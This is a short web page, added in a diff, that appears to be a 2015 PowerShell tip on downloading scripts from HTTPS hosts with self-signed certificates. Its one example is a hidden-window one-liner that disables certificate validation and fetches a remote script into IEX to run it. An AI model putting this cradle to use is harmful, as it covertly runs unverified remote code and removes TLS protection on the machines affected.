@@ -1,0 +1,17 @@
+<html><head><title>Using self-signed SSL certificates with PowerShell</title> <style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head> <body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 11pt"><pre><hr>|| Using self-signed SSL certificates with PowerShell, author: xor-function || 10/19/2015 || <a style="text-decoration: none" href="../"><span style="text-decoration: none">Back to main</span></a>  <hr></pre><pre>
+
+One bit of info that seems to fade into the background is when using "Webclient.DownloadString" on a HTTPS site that is 
+using a self-signed certificate.
+
+This will fail to complete successfully.
+
+Meaning if your cert has not been signed by a CA / purchased and you try to perform a PowerShell webclient download string 
+on a script from that domain via https, it will fail. In order to get this working again you have to add additional code 
+to ignore cert checking.
+
+Example IEX download string one-liner:
+
+[  cmd /c powershell.exe -w hidden -c "&{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};
+   iex(New-Object System.Net.Webclient).DownloadString('https://192.168.0.15/your-script')}"  ]
+
+</pre></body></html>
